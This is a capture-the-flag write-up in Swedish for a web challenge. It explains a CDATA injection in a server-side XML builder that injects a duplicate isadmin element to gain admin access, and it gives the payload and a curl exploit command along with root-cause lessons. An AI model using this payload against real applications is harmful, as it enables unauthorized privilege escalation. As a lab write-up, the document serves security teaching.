# XML-kontroll 2 — Svenska

**Kategori:** Webb. **Poäng:** 1000.
**Mål:** `http://xmlkontroll2.challs.crate.nu` (Flask/gunicorn).
**Flaggformat:** `cratectf{...}` (det bokstavliga värdet är redigerat — du återskapar
det själv).

En CDATA-injektion i en XML-byggare på serversidan låter dig injicera ett andra
`<isadmin>true</isadmin>`-element, vilket växlar kontot till admin och avslöjar en
admin-endast nyhetsartikel som innehåller flaggan.

## 1. Spaning

Appen har två rutter: `/` (nyhetsflöde) och `/settings` (ett formulär med fälten `name`
och `country`). Inställningsformuläret postar som multipart:

```html
<form action="/settings?debug=0" method="post" enctype="multipart/form-data">
```

Query-parametern `debug` är nyckelspåret. POSTa till `/settings?debug=1` så ekar servern
tillbaka den **XML den bygger och parsar** på serversidan:

```bash
curl -s -X POST "http://xmlkontroll2.challs.crate.nu/settings?debug=1" \
  -F "name=testuser" -F "country=se"
```

Debug-utdatan ("XML parser input") innehåller:

```xml
<?xml version="1.0"?>
<user>
  <isadmin>false</isadmin>
  <name><![CDATA[testuser]]></name>
  <country><![CDATA[se]]></country>
</user>
```

Både `name` och `country` interpoleras **utan escaping** in i `CDATA`-block. Kontot har
som standard `<isadmin>false</isadmin>`.

## 2. Sårbarheten — CDATA-injektion

Inget neutraliserar CDATA-avslutaren `]]>` i användarinmatning. Ett `name`-värde som
innehåller `]]>` avslutar CDATA-sektionen tidigt, varefter angriparens text parsas som
**riktig XML**. Vi injicerar ett andra `<isadmin>true</isadmin>`-syskon och återöppnar
sedan en CDATA-sektion så att mallens avslutande `]]></name>` förblir välformad.

En naiv nyttolast (`]]><isadmin>true</isadmin><name><![CDATA[x`) öppnar ett nästlat
`<name>` utan att stänga det ursprungliga, vilket lämnar mallens avslutande `</name>`
oparad → HTTP 500. Den **balanserade** nyttolasten stänger `</name>` först:

```
name    = ]]></name><isadmin>true</isadmin><name><![CDATA[
country  = se
```

Insatt i mallen ger detta välformad XML med **två** `<isadmin>`-element:

```xml
<user>
  <isadmin>false</isadmin>
  <name><![CDATA[]]></name><isadmin>true</isadmin><name><![CDATA[]]></name>
  <country><![CDATA[se]]></country>
</user>
```

Backendens XML→objekt-steg tar det **sista** `<isadmin>`-värdet det ser, så förfrågan
behandlas som admin.

## 3. Exploit

```bash
curl -s -X POST "http://xmlkontroll2.challs.crate.nu/settings?debug=1" \
  -F "name=]]></name><isadmin>true</isadmin><name><![CDATA[" \
  -F "country=se" \
  | grep -o "cratectf{[^}]*}"
```

(`debug=1` är bekvämt för att bekräfta den injicerade XML:en, men själva
privilegie-eskaleringen fungerar oavsett debug-flaggan — flaggan dyker upp i det
renderade admin-endast-innehållet.)

### Vad svaret visar

Med `isadmin` nu `true` får svarets nyhetsflöde en extra, markerad (grå)
**admin-endast** artikel — en nyhet om "läckt VD-lösenord" (*"Stulen kunddata från
dataintrång nu till salu på dark web"*). Dess brödtext innehåller flaggan i klartext i
formatet `cratectf{...}`. `grep`-raden ovan extraherar den direkt.

## Verifiering

Plattformsbekräftat löst. Den balanserade CDATA-injektionsnyttolasten i `name`-fältet
injicerar ett andra `<isadmin>true</isadmin>`, parsern respekterar det sista värdet, och
admin-endast nyhetsartikeln renderar sedan flaggan i formatet `cratectf{...}`.

## Grundorsak / lärdom

- Interpolera aldrig användarinmatning i XML (inte ens inuti `CDATA`) utan att escapa
  `]]>`.
- "Sista elementet vinner"-deserialisering är farlig när duplicerade element kan
  injiceras — validera mot ett strikt schema med enstaka förekomst innan du litar på
  auktoriseringsflaggor som `isadmin`.
- Debug-/diagnostik-endpoints som ekar interna strukturer bör aldrig vara nåbara i
  produktion.
